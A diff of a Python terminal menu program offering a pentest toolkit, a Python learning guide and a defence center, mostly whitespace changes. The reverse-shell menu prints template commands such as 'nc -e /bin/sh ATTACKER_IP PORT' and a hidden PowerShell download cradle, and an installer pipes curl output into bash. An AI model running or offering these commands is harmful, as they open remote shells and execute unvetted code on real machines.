         print(f" {BOLD}[27]{RESET} ⚙️ Tool Benchmarking & Optimization ")
-        
+
         print(f"\n{BOLD}SYSTEM INFO OPTIONS:{RESET}")
         print(f" {BOLD}[D]{RESET} 🖥️ System Profile & Tool Availability")
         print(f" {BOLD}[F]{RESET} 🏗️ Frameworks & Methodologies Guide")
@@ -8273,7 +9492,7 @@ def feature_pentest_toolkit():
 
         if choice == '0':
             break
-        
+
         # Info Options
         elif choice.upper() == 'D':
             _pt_show_system_profile()
@@ -8293,7 +9512,7 @@ def feature_pentest_toolkit():
         elif choice.upper() == 'T':
             _pt_show_tool_comparison()
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         # Category 1: Reconnaissance
         elif choice == '1':
             print_header("🔎 OSINT & Passive Intelligence Gathering")
@@ -8307,7 +9526,7 @@ def feature_pentest_toolkit():
             print("  • GitHub reconnaissance - Code exposure")
             print("  • Social media profiling - Personal info")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '2':
             print_header("🗺️ Network Mapping & Asset Discovery")
             print(f"\n{COLORS['2'][0]}Network Discovery Techniques:{RESET}")
@@ -8319,10 +9538,10 @@ def feature_pentest_toolkit():
             print("  • NetBIOS Discovery - Windows systems")
             print("  • LLMNR Poisoning - Name resolution")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '3':
             feature_nmap_scanner()
-        
+
         elif choice == '4':
             print_header("🌐 Web Application Reconnaissance")
             print(f"\n{COLORS['2'][0]}Web Recon Activities:{RESET}")
@@ -8334,7 +9553,7 @@ def feature_pentest_toolkit():
             print("  • Robots.txt analysis - Crawl restrictions")
             print("  • Sitemap discovery - Site structure")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '5':
             print_header("📱 Social Engineering Intelligence")
             print(f"\n{COLORS['2'][0]}Social Engineering Methods:{RESET}")
@@ -8346,7 +9565,7 @@ def feature_pentest_toolkit():
             print("  • Vishing - Voice social engineering")
             print("  • Compliance bypass - Policy circumvention")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         # Category 2: Vulnerability Assessment
         elif choice == '6':
             print_header("🔍 Vulnerability Scanner & Analyzer")
@@ -8356,7 +9575,7 @@ def feature_pentest_toolkit():
             print("  • Qualys - Cloud-based scanning")
             print("  • Rapid7 InsightVM - Vulnerability management")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '7':
             print_header("🎯 CVE & Exploit Database Lookup")
             info = {
@@ -8368,7 +9587,7 @@ def feature_pentest_toolkit():
                 for key, value in details.items():
                     print(f"  {key}: {value}")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '8':
             print_header("🔐 Cryptographic Weakness Detection")
             print(f"\n{COLORS['2'][0]}Crypto Weaknesses:{RESET}")
@@ -8378,10 +9597,10 @@ def feature_pentest_toolkit():
             print("  • SSL/TLS issues - Protocol problems")
             print("  • Entropy issues - Random number quality")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '9':
             feature_aircrack_toolkit()
-        
+
         elif choice == '10':
             print_header("💻 Configuration & Misconfiguration Checker")
             print(f"\n{COLORS['2'][0]}Common Misconfigurations:{RESET}")
@@ -8391,14 +9610,14 @@ def feature_pentest_toolkit():
             print("  • Open shares - Exposed network drives")
             print("  • Debug mode enabled - Information disclosure")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         # Category 3: Exploitation
         elif choice == '11':
             feature_metasploit_console()
-        
+
         elif choice == '12':
             feature_hydra_bruteforce()
-        
+
         elif choice == '13':
             print_header("🔓 SQL Injection & Web Attack Tools")
             print(f"\n{COLORS['2'][0]}Web Attack Techniques:{RESET}")
@@ -8407,7 +9626,7 @@ def feature_pentest_toolkit():
             print("  • Commix - Command injection tool")
             print("  • Upload exploits - File upload abuse")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '14':
             print_header("🎭 Payload Generator & Encoder")
             print(f"\n{COLORS['2'][0]}Payload Types:{RESET}")
@@ -8416,7 +9635,7 @@ def feature_pentest_toolkit():
             print("  • Encoders - Hex, Base64, XOR")
             print("  • Obfuscators - Code hiding tools")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '15':
             print_header("🚀 Reverse Shell & Remote Access")
             print(f"\n{COLORS['2'][0]}Reverse Shell Methods:{RESET}")
@@ -8425,7 +9644,7 @@ def feature_pentest_toolkit():
             print("  PowerShell: pwsh -NoP -W H -C IEX(New-Object...)")
             print("  Netcat: nc -e /bin/sh ATTACKER_IP PORT")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         # Category 4: Post-Exploitation
         elif choice == '16':
             print_header("🔑 Privilege Escalation Framework")
@@ -8436,10 +9655,10 @@ def feature_pentest_toolkit():
             print("  • DLL injection - Windows escalation")
             print("  • Token impersonation - Windows privesc")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '17':
             feature_password_cracking()
-        
+
         elif choice == '18':
             print_header("🕵️ Lateral Movement & Pivot Tools")
             print(f"\n{COLORS['2'][0]}Lateral Movement Techniques:{RESET}")
@@ -8448,7 +9667,7 @@ def feature_pentest_toolkit():
             print("  • Bloodhound - AD mapping")
             print("  • Impacket - Protocol tools")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '19':
             print_header("📡 Persistence & Backdoor Installation")
             print(f"\n{COLORS['2'][0]}Persistence Methods:{RESET}")
@@ -8458,7 +9677,7 @@ def feature_pentest_toolkit():
             print("  • Rootkits - Kernel backdoors")
             print("  • Web shells - Web persistence")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '20':
             print_header("🚪 Windows/Linux Privilege Abuse")
             print(f"\n{COLORS['2'][0]}Privilege Abuse Techniques:{RESET}")
@@ -8466,7 +9685,7 @@ def feature_pentest_toolkit():
             print("  Windows: UAC bypass, Token impersonation")
             print("  Both: Weak permissions, Cron/Task abuse")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         # Category 5: Analysis & Reporting
         elif choice == '21':
             print_header("📊 Attack Chain Analyzer & Visualizer")
@@ -8476,7 +9695,7 @@ def feature_pentest_toolkit():
             for step in chain:
                 print(f"  {step}")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '22':
             print_header("📋 Report Generator & Documentation")
             report_name = input("Report name: ").strip()
@@ -8492,7 +9711,7 @@ def feature_pentest_toolkit():
                 print(f"  Target: {target}")
                 print(f"  Findings structure created")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '23':
             print_header("📈 Compliance & Framework Checker")
             framework = input("Select framework (OWASP_TOP_10/NIST/ISO27001/PCI-DSS): ").strip()
@@ -8501,7 +9720,7 @@ def feature_pentest_toolkit():
             for check in checks:
                 print(f"  ☐ {check}")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '24':
             print_header("🎓 Training & Knowledge Base")
             print(f"\n{COLORS['2'][0]}Learning Resources:{RESET}")
@@ -8512,7 +9731,7 @@ def feature_pentest_toolkit():
             print("  • TryHackMe - Interactive labs")
             print("  • SANS courses - Professional training")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         # Category 6: System & Infrastructure
         elif choice == '25':
             os.system('cls' if os.name == 'nt' else 'clear')
@@ -8525,10 +9744,10 @@ def feature_pentest_toolkit():
             print(f"\n{COLORS['6'][0]}macOS:{RESET}")
             print("  brew install nmap aircrack-ng john")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '26':
             feature_download_center()
-        
+
         elif choice == '27':
             print_header("⚙️ Tool Benchmarking & Optimization")
             print(f"\n{COLORS['2'][0]}Performance Metrics:{RESET}")
@@ -8537,7 +9756,7 @@ def feature_pentest_toolkit():
             print("  • Parallel job optimization")
             print("  • Memory usage analysis")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         else:
             print(f"{COLORS['1'][0]}Invalid option{RESET}")
             time.sleep(1)
@@ -8835,12 +10054,12 @@ def _python_power_scientific():
 
 class PythonPowerOptimizer:
     """AI-powered Python learning optimizer with STEM integration"""
-    
+
     def __init__(self):
         self.skill_levels = {"Beginner": 1, "Intermediate": 2, "Advanced": 3, "Expert": 4}
         self.stem_areas = ["Science", "Technology", "Engineering", "Mathematics"]
         self.project_categories = ["Data Science", "Web Development", "Automation", "Game Dev", "AI/ML"]
-    
+
     def analyze_python_skills(self, level="Beginner"):
         """Analyze current Python skill level"""
         skills = {
@@ -8870,7 +10089,7 @@ class PythonPowerOptimizer:
             }
         }
         return skills.get(level, skills["Beginner"])
-    
+
     def suggest_learning_path(self, start_level, target_area):
         """AI-generated personalized learning path"""
         paths = {
@@ -8901,7 +10120,7 @@ class PythonPowerOptimizer:
             }
         }
         return paths.get(target_area, paths["Data Science"])
-    
+
     def generate_stem_exercises(self, category, difficulty="Beginner"):
         """Algorithm: Generate STEM-focused exercises"""
         exercises = {
@@ -8963,7 +10182,7 @@ class PythonPowerOptimizer:
             }
         }
         return exercises.get(category, {}).get(difficulty, [])
-    
+
     def recommend_projects(self, skill_level, interests):
         """AI-powered project recommendations"""
         projects = {
@@ -8987,7 +10206,7 @@ class PythonPowerOptimizer:
             ]
         }
         return projects.get(skill_level, projects["Beginner"])
-    
+
     def estimate_career_readiness(self, current_level, target_role):
         """Algorithm: Career path readiness assessment"""
         readiness = {
@@ -8998,7 +10217,7 @@ class PythonPowerOptimizer:
             "Research Scientist": {"Beginner": "0%", "Intermediate": "20%", "Advanced": "70%", "Expert": "100%"}
         }
         return readiness.get(target_role, {}).get(current_level, "Unknown")
-    
+
     def get_resource_recommendations(self):
         """Algorithm: Recommend learning resources"""
         return {
@@ -9096,32 +10315,32 @@ def _generate_python_power_visualization():
 def feature_enhanced_python_power():
     """600% Enhanced Python Power with AI-powered STEM learning ecosystem"""
     optimizer = PythonPowerOptimizer()
-    
+
     while True:
         os.system('cls' if os.name == 'nt' else 'clear')
         print_header("🐍 Python Power - 600% AI STEM Enhancement")
         print(_generate_python_power_visualization())
-        
+
         print(f"\n{BOLD}═══ SKILL ASSESSMENT & LEARNING ═══{RESET}")
         print(f" {BOLD}[1]{RESET} 📊 AI Skill Assessment - Evaluate your current level")
         print(f" {BOLD}[2]{RESET} 🎯 Personalized Learning Path - AI-generated roadmap")
         print(f" {BOLD}[3]{RESET} 💡 STEM Project Generator - Get project ideas with AI")
         print(f" {BOLD}[4]{RESET} 🔬 STEM Exercises - 100+ coding challenges")
-        
+
         print(f"\n{BOLD}═══ DEVELOPMENT TOOLS & ECOSYSTEM ═══{RESET}")
         print(f" {BOLD}[5]{RESET} 🛠️ 35+ Dev App Recommendations - IDEs, frameworks, tools")
         print(f" {BOLD}[6]{RESET} 📚 Learning Resources - 20+ platforms & tutorials")
         print(f" {BOLD}[7]{RESET} 🚀 Career Path Calculator - Assess readiness for roles")
         print(f" {BOLD}[8]{RESET} 🎓 Advanced Topics & Specializations")
         print(f" {BOLD}[9]{RESET} 💻 Code Templates & Boilerplates - Quick project start")
-        
+
         print(f"\n{BOLD}[0]{RESET} Return to Main Menu")
-        
+
         choice = input(f"\n{BOLD}🎯 Select Option (0-9): {RESET}").strip()
-        
+
         if choice == '0':
             return
-        
+
         elif choice == '1':
             # AI Skill Assessment
             os.system('cls' if os.name == 'nt' else 'clear')
@@ -9131,219 +10350,219 @@ def feature_enhanced_python_power():
             print(" [2] Intermediate - Have completed projects")
             print(" [3] Advanced - Professional experience")
             print(" [4] Expert - Industry specialist")
-            
+
             level_choice = input(f"\n{BOLD}Select (1-4): {RESET}").strip()
             levels = {"1": "Beginner", "2": "Intermediate", "3": "Advanced", "4": "Expert"}
             selected_level = levels.get(level_choice, "Beginner")
-            
+
             skills = optimizer.analyze_python_skills(selected_level)
-            
+
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header(f"🎯 {selected_level} Python Developer Profile")
-            
+
             print(f"\n{COLORS['2'][0]}Core Topics to Master:{RESET}")
             for i, topic in enumerate(skills["topics"], 1):
                 print(f"  {i}. {topic}")
-            
+
             print(f"\n{COLORS['3'][0]}Recommended Projects:{RESET}")
             for i, proj in enumerate(skills["projects"], 1):
                 print(f"  {i}. {proj}")
-            
+
             print(f"\n{COLORS['6'][0]}Estimated Timeline: {skills['time_estimate']}{RESET}")
             print(f"{COLORS['5'][0]}Recommended Tools: {', '.join(skills['recommended_apps'])}{RESET}")
-            
+
             # Log assessment
             assessment_log = f"Python Skill Assessment\nLevel: {selected_level}\nTopics: {', '.join(skills['topics'])}\nProjects: {', '.join(skills['projects'])}\n"
             save_log_file("python_power", f"Skill_Assessment_{selected_level}", assessment_log, prompt_user=True)
-            
+
             input(f"\n{BOLD}[ Press Enter to continue... ]{RESET}")
-        
+
         elif choice == '2':
             # Personalized Learning Path
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("🎯 Personalized Learning Path Generator")
-            
+
             print(f"\n{BOLD}Choose your area of interest:{RESET}")
             areas = ["Data Science", "Web Development", "Automation", "Game Development", "AI/ML"]
             for i, area in enumerate(areas, 1):
                 print(f" [{i}] {area}")
-            
+
             area_choice = input(f"\n{BOLD}Select (1-5): {RESET}").strip()
             selected_area = areas[int(area_choice)-1] if area_choice.isdigit() and 1 <= int(area_choice) <= 5 else "Data Science"
-            
+
             path = optimizer.suggest_learning_path("Intermediate", selected_area)
-            
+
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header(f"📚 {selected_area} Learning Path")
-            
+
             print(f"\n{COLORS['2'][0]}Beginner Stage:{RESET}")
             for i, step in enumerate(path.get("Beginner", []), 1):
                 print(f"  {i}. {step}")
-            
+
             print(f"\n{COLORS['3'][0]}Intermediate Stage:{RESET}")
             for i, step in enumerate(path.get("Intermediate", []), 1):
                 print(f"  {i}. {step}")
-            
+
             print(f"\n{COLORS['5'][0]}Advanced Stage:{RESET}")
             for i, step in enumerate(path.get("Advanced", []), 1):
                 print(f"  {i}. {step}")
-            
+
             path_log = f"Learning Path: {selected_area}\nBeginner: {', '.join(path.get('Beginner', []))}\nIntermediate: {', '.join(path.get('Intermediate', []))}\nAdvanced: {', '.join(path.get('Advanced', []))}\n"
             save_log_file("python_power", f"Learning_Path_{selected_area}", path_log, prompt_user=True)
-            
+
             input(f"\n{BOLD}[ Press Enter to continue... ]{RESET}")
-        
+
         elif choice == '3':
             # STEM Project Generator
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("💡 STEM Project Generator")
-            
+
             print(f"\n{BOLD}Select skill level:{RESET}")
             levels = {"1": "Beginner", "2": "Intermediate", "3": "Advanced"}
             for k, v in levels.items():
                 print(f" [{k}] {v}")
-            
+
             level_choice = input(f"\n{BOLD}Select (1-3): {RESET}").strip()
             selected_level = levels.get(level_choice, "Beginner")
-            
+
             projects = optimizer.recommend_projects(selected_level, [])
-            
+
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header(f"🎯 {selected_level} Project Ideas")
-            
+
             for i, proj in enumerate(projects, 1):
                 print(f"\n{COLORS['2'][0]}[{i}] {proj['name']}{RESET}")
                 print(f"    Tech Stack: {proj['tech']}")
                 print(f"    Duration: {proj['time']}")
-            
+
             proj_log = f"STEM Projects for {selected_level} Level\n"
             for proj in projects:
                 proj_log += f"\n- {proj['name']}\n  Tech: {proj['tech']}\n  Time: {proj['time']}\n"
-            
+
             save_log_file("python_power", f"Projects_{selected_level}", proj_log, prompt_user=True)
-            
+
             input(f"\n{BOLD}[ Press Enter to continue... ]{RESET}")
-        
+
         elif choice == '4':
             # STEM Exercises
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("🔬 STEM Exercises & Coding Challenges")
-            
+
             print(f"\n{BOLD}Select STEM Category:{RESET}")
             categories = ["Science", "Technology", "Engineering", "Mathematics"]
             for i, cat in enumerate(categories, 1):
                 print(f" [{i}] {cat}")
-            
+
             cat_choice = input(f"\n{BOLD}Select (1-4): {RESET}").strip()
             selected_cat = categories[int(cat_choice)-1] if cat_choice.isdigit() and 1 <= int(cat_choice) <= 4 else "Science"
-            
+
             print(f"\n{BOLD}Select difficulty:{RESET}")
             print(" [1] Beginner")
             print(" [2] Advanced")
-            
+
             diff_choice = input(f"\n{BOLD}Select (1-2): {RESET}").strip()
             difficulty = "Advanced" if diff_choice == "2" else "Beginner"
-            
+
             exercises = optimizer.generate_stem_exercises(selected_cat, difficulty)
-            
+
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header(f"🎯 {selected_cat} - {difficulty} Exercises")
-            
+
             for i, exercise in enumerate(exercises, 1):
                 print(f"\n{COLORS['3'][0]}[{i}] {exercise}{RESET}")
-            
+
             ex_log = f"STEM Exercises - {selected_cat} ({difficulty})\n"
             for ex in exercises:
                 ex_log += f"- {ex}\n"
-            
+
             save_log_file("python_power", f"Exercises_{selected_cat}_{difficulty}", ex_log, prompt_user=True)
-            
+
             input(f"\n{BOLD}[ Press Enter to continue... ]{RESET}")
-        
+
         elif choice == '5':
             # Dev Apps
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("🛠️ 35+ Python Development Apps Ecosystem")
-            
+
             apps = _get_python_power_apps()
-            
+
             for i, (category, tools) in enumerate(apps.items(), 1):
                 print(f"\n{COLORS['2'][0]}{i}. {category}{RESET}")
                 for tool, desc in tools.items():
                     print(f"   {COLORS['3'][0]}✓ {tool}:{RESET} {desc}")
-            
+
             apps_log = "Python Development Apps Ecosystem\n\n"
             for category, tools in apps.items():
                 apps_log += f"\n{category}\n"
                 for tool, desc in tools.items():
                     apps_log += f"- {tool}: {desc}\n"
-            
+
             save_log_file("python_power", "Dev_Apps_Ecosystem", apps_log, prompt_user=True)
-            
+
             input(f"\n{BOLD}[ Press Enter to continue... ]{RESET}")
-        
+
         elif choice == '6':
             # Learning Resources
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("📚 20+ Learning Resources & Platforms")
-            
+
             resources = optimizer.get_resource_recommendations()
-            
+
             for category, items in resources.items():
                 print(f"\n{COLORS['2'][0]}{category}:{RESET}")
                 for i, item in enumerate(items, 1):
                     print(f"  {i}. {item}")
-            
+
             res_log = "Learning Resources\n\n"
             for category, items in resources.items():
                 res_log += f"\n{category}\n"
                 for item in items:
                     res_log += f"- {item}\n"
-            
+
             save_log_file("python_power", "Learning_Resources", res_log, prompt_user=True)
-            
+
             input(f"\n{BOLD}[ Press Enter to continue... ]{RESET}")
-        
+
         elif choice == '7':
             # Career Readiness
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("🚀 Career Path Calculator")
-            
+
             print(f"\n{BOLD}Select your current skill level:{RESET}")
             levels = {"1": "Beginner", "2": "Intermediate", "3": "Advanced", "4": "Expert"}
             for k, v in levels.items():
                 print(f" [{k}] {v}")
-            
+
             level_choice = input(f"\n{BOLD}Select (1-4): {RESET}").strip()
             current_level = levels.get(level_choice, "Beginner")
-            
+
             roles = ["Data Scientist", "Backend Developer", "ML Engineer", "DevOps Engineer", "Research Scientist"]
             print(f"\n{BOLD}Select target role:{RESET}")
             for i, role in enumerate(roles, 1):
                 print(f" [{i}] {role}")
-            
+
             role_choice = input(f"\n{BOLD}Select (1-5): {RESET}").strip()
             target_role = roles[int(role_choice)-1] if role_choice.isdigit() and 1 <= int(role_choice) <= 5 else "Data Scientist"
-            
+
             readiness = optimizer.estimate_career_readiness(current_level, target_role)
-            
+
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header(f"📊 Career Readiness: {target_role}")
-            
+
             print(f"\n{COLORS['2'][0]}Current Level: {current_level}{RESET}")
             print(f"{COLORS['3'][0]}Target Role: {target_role}{RESET}")
             print(f"{COLORS['5'][0]}Readiness: {readiness}{RESET}")
-            
+
             career_log = f"Career Readiness Assessment\nLevel: {current_level}\nTarget: {target_role}\nReadiness: {readiness}\n"
             save_log_file("python_power", f"Career_Assessment_{target_role}", career_log, prompt_user=True)
-            
+
             input(f"\n{BOLD}[ Press Enter to continue... ]{RESET}")
-        
+
         elif choice == '8':
             # Advanced Topics
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("🎓 Advanced Topics & Specializations")
-            
+
             advanced = {
                 "Machine Learning": ["Neural Networks", "Transformers", "Reinforcement Learning", "Large Language Models"],
                 "Web Development": ["GraphQL APIs", "Microservices", "Serverless", "Edge Computing"],
@@ -9351,28 +10570,28 @@ def feature_enhanced_python_power():
                 "DevOps": ["CI/CD", "Kubernetes", "Infrastructure as Code", "Cloud Architecture"],
                 "Quantum Computing": ["Quantum Gates", "Quantum Circuits", "Variational Algorithms", "QAOA"]
             }
-            
+
             print()
             for i, (topic, subtopics) in enumerate(advanced.items(), 1):
                 print(f"{COLORS['2'][0]}[{i}] {topic}:{RESET}")
                 for sub in subtopics:
                     print(f"     • {sub}")
-            
+
             adv_log = "Advanced Topics & Specializations\n\n"
             for topic, subtopics in advanced.items():
                 adv_log += f"\n{topic}\n"
                 for sub in subtopics:
                     adv_log += f"- {sub}\n"
-            
+
             save_log_file("python_power", "Advanced_Topics", adv_log, prompt_user=True)
-            
+
             input(f"\n{BOLD}[ Press Enter to continue... ]{RESET}")
-        
+
         elif choice == '9':
             # Code Templates
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("💻 Code Templates & Boilerplates")
-            
+
             templates = {
                 "Web API": "FastAPI + SQLAlchemy + Pydantic",
                 "Data Pipeline": "Pandas + Airflow + Spark",
@@ -9383,19 +10602,19 @@ def feature_enhanced_python_power():
                 "CLI Tool": "Click + Typer + Rich",
                 "Desktop App": "PyQt + SQLite + Threading"
             }
-            
+
             print()
             for i, (name, stack) in enumerate(templates.items(), 1):
                 print(f"{COLORS['2'][0]}[{i}] {name}:{RESET} {COLORS['3'][0]}{stack}{RESET}")
-            
+
             template_log = "Code Templates & Boilerplates\n\n"
             for name, stack in templates.items():
                 template_log += f"{name}: {stack}\n"
-            
+
             save_log_file("python_power", "Code_Templates", template_log, prompt_user=True)
-            
+
             input(f"\n{BOLD}[ Press Enter to continue... ]{RESET}")
-        
+
         else:
             print(f"{COLORS['1'][0]}Invalid option{RESET}")
             time.sleep(1)
@@ -9414,14 +10633,14 @@ from datetime import datetime, timedelta
 # Defence AI System - Real-time threat detection and response
 class DefenceAISystem:
     """AI-powered defence system with real-time threat analysis"""
-    
+
     def __init__(self):
         self.threat_log = []
         self.defence_state = {}
         self.swap_operations = []
         self.data_folder = "pythonOS_data"
         self._ensure_folders()
-    
+
     def _ensure_folders(self):
         """Ensure pythonOS_data and defence folders exist"""
         try:
@@ -9429,7 +10648,7 @@ class DefenceAISystem:
                 os.makedirs(folder, exist_ok=True)
         except Exception:
             pass
-    
+
     def analyze_threat(self, threat_type, severity, description):
         """Algorithm 1: AI threat analysis and classification"""
         threat = {
@@ -9443,7 +10662,7 @@ class DefenceAISystem:
         self.threat_log.append(threat)
         self._save_to_swap(f"threat_{threat['hash']}.json", threat)
         return threat
-    
+
     def _generate_ai_response(self, threat_type, severity):
         """Algorithm 2: AI generates appropriate response"""
         responses = {
@@ -9454,7 +10673,7 @@ class DefenceAISystem:
             'ANOMALY': f"[AI] Increase monitoring, log behavior pattern"
         }
         return responses.get(threat_type, "[AI] Escalate to administrator")
-    
+
     def _save_to_swap(self, filename, data):
         """Save data to swap folder for real-time access"""
         try:
@@ -9464,7 +10683,7 @@ class DefenceAISystem:
             self.swap_operations.append({'file': filename, 'timestamp': datetime.now().isoformat()})
         except Exception:
             pass
-    
+
     def generate_defence_config(self, system_type):
         """Algorithm 3: Generate optimized defence configuration"""
         configs = {
@@ -9491,7 +10710,7 @@ class DefenceAISystem:
             }
         }
         return configs.get(system_type, {})
-    
+
     def predict_vulnerabilities(self, system_info):
         """Algorithm 4: AI predicts potential vulnerabilities"""
         predictions = []
@@ -9502,7 +10721,7 @@ class DefenceAISystem:
         if 'weak_passwords' in system_info:
             predictions.append({'risk': 'HIGH', 'issue': 'Weak passwords', 'fix': 'Enforce strong policies'})
         return predictions
-    
+
     def generate_incident_response_plan(self, incident_type):
         """Algorithm 5: Generate IR plan for incident"""
         plans = {
@@ -9523,7 +10742,7 @@ class DefenceAISystem:
             }
         }
         return plans.get(incident_type, {})
-    
+
     def monitor_real_time(self):
         """Algorithm 6: Real-time monitoring with AI analysis"""
         monitoring_data = {
@@ -9536,7 +10755,7 @@ class DefenceAISystem:
             'ai_recommendations': []
         }
         return monitoring_data
-    
+
     def get_threat_report(self):
         """Generate comprehensive threat report"""
         return {
@@ -10087,7 +11306,7 @@ def feature_vpn_management():
     print(f" {BOLD}[3]{RESET} ✅ Check VPN Status")
     print(f" {BOLD}[4]{RESET} 🛡️  Configure Encryption")
     choice = input(f"\n{BOLD}🎯 Select: {RESET}").strip()
-    
+
     if choice == '1':
         print(f"\n{COLORS['2'][0]}WireGuard Installation...{RESET}")
         os.system("sudo apt-get update && sudo apt-get install -y wireguard wireguard-tools")
@@ -10114,7 +11333,7 @@ def feature_adblocker_setup():
     print(f" {BOLD}[3]{RESET} 📋 Add blocklists")
     print(f" {BOLD}[4]{RESET} ✅ Test blocking")
     choice = input(f"\n{BOLD}🎯 Select: {RESET}").strip()
-    
+
     if choice == '1':
         print(f"\n{COLORS['2'][0]}Installing Pi-hole...{RESET}")
         os.system("curl -sSL https://install.pi-hole.net | bash 2>/dev/null || echo 'Pi-hole installation skipped'")
@@ -10143,7 +11362,7 @@ def feature_pihole_management():
     print(f" {BOLD}[3]{RESET} ⚙️  Configure Settings")
     print(f" {BOLD}[4]{RESET} 🚀 Enable/Disable Gravity")
     choice = input(f"\n{BOLD}🎯 Select: {RESET}").strip()
-    
+
     if choice == '1':
         print(f"\n{COLORS['2'][0]}Pi-hole Dashboard (http://pi.hole/admin){RESET}")
     elif choice == '2':
@@ -10169,7 +11388,7 @@ def feature_threat_intelligence():
     print(f" {BOLD}[3]{RESET} 📡 AlienVault OTX")
     print(f" {BOLD}[4]{RESET} 🗂️  CVE Database")
     choice = input(f"\n{BOLD}🎯 Select: {RESET}").strip()
-    
+
     if choice == '1':
         domain = input("Enter domain/IP: ").strip()
         if domain:
@@ -10194,7 +11413,7 @@ def feature_devsecops():
     print(f" {BOLD}[3]{RESET} 🔐 Secret Detection (TruffleHog)")
     print(f" {BOLD}[4]{RESET} ✅ Run Safety (Dependency check)")
     choice = input(f"\n{BOLD}🎯 Select: {RESET}").strip()
-    
+
     if choice == '1':
         path = input("Enter Python file/directory: ").strip()
         if path and os.path.exists(path):
@@ -10228,46 +11447,46 @@ def feature_defence_center():
         print(f"\n{BOLD}{c}╔{'═'*70}╗{RESET}")
         print(f"{BOLD}{c}║{RESET}  {BOLD}DEFENCE COMMAND CENTER - 27 FEATURES{RESET}{'':>28}{BOLD}{c}║{RESET}")
         print(f"{BOLD}{c}╠{'═'*70}╣{RESET}")
-        
+
         print(f"\n{BOLD}CATEGORY 1: Threat Detection & Analysis (5 options){RESET}")
         print(f" {BOLD}[1]{RESET}  🚨 Real-Time Threat Monitor (NEW) - AI-powered live detection")
         print(f" {BOLD}[2]{RESET}  🧠 AI Threat Analysis Engine (NEW) - Machine learning classification")
         print(f" {BOLD}[3]{RESET}  📊 Threat Intelligence & Feeds (enhanced)")
         print(f" {BOLD}[4]{RESET}  🔍 Vulnerability Prediction (NEW) - AI forecasting")
         print(f" {BOLD}[5]{RESET}  📈 Anomaly Detection System (NEW) - Behavioral analysis")
-        
+
         print(f"\n{BOLD}CATEGORY 2: Incident Response (5 options){RESET}")
         print(f" {BOLD}[6]{RESET}  🎯 Incident Response Planning (NEW) - Automated IR plans")
         print(f" {BOLD}[7]{RESET}  🚫 Threat Quarantine & Isolation (enhanced)")
         print(f" {BOLD}[8]{RESET}  📋 Forensic Evidence Collection (NEW)")
         print(f" {BOLD}[9]{RESET}  ⏮️  Automated Recovery System (NEW) - Self-healing")
         print(f" {BOLD}[10]{RESET} 📞 Incident Notification System (NEW)")
-        
+
         print(f"\n{BOLD}CATEGORY 3: Preventive Security (5 options){RESET}")
         print(f" {BOLD}[11]{RESET} 🔐 VPN & Encryption Management (enhanced)")
         print(f" {BOLD}[12]{RESET} 🛡️  Firewall & Access Control (enhanced)")
         print(f" {BOLD}[13]{RESET} 🌐 Ad Blocking & Content Filter (NEW)")
         print(f" {BOLD}[14]{RESET} 🔒 Secrets Management Vault (NEW) - Encrypted storage")
         print(f" {BOLD}[15]{RESET} 🛂 Identity & Access Management (NEW)")
-        
+
         print(f"\n{BOLD}CATEGORY 4: Malware Defense (5 options){RESET}")
         print(f" {BOLD}[16]{RESET} 🦠 ClamAV Antivirus Engine (enhanced)")
         print(f" {BOLD}[17]{RESET} 📁 File Integrity Monitoring (NEW) - Real-time hashing")
         print(f" {BOLD}[18]{RESET} 🎯 Yara Rule Scanning (NEW) - Advanced pattern matching")
         print(f" {BOLD}[19]{RESET} 🚫 Ransomware Prevention (NEW) - Behavioral blocking")
         print(f" {BOLD}[20]{RESET} 🧬 Malware Analysis Lab (NEW) - Sandbox environment")
-        
+
         print(f"\n{BOLD}CATEGORY 5: Logging & Compliance (4 options){RESET}")
         print(f" {BOLD}[21]{RESET} 📋 SIEM Log Analysis (enhanced)")
         print(f" {BOLD}[22]{RESET} 📊 Compliance Audit Trail (NEW) - GDPR/HIPAA ready")
         print(f" {BOLD}[23]{RESET} 🎓 Security Posture Report (NEW) - AI-generated insights")
         print(f" {BOLD}[24]{RESET} 📈 Threat Analytics Dashboard (NEW)")
-        
+
